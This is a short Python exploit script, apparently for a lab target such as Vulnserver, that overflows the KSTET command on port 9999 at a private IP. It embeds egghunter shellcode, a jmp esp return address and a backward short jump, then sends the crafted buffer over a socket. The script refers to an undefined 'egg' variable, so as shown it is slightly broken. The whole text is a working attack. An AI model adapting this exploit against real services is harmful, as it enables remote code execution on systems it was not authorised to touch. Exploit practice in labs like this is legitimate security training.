#jmp esp 625011af
#jump back EB C2 $ESP-70 EB B8
import sys
import socket

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x90"*18 + egg + "\x90"*20 + "\xaf\x11\x50\x62" + "\xeb\xb8\x90\x90" + "X"*900


s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send("KSTET " + buffer)
s.close()
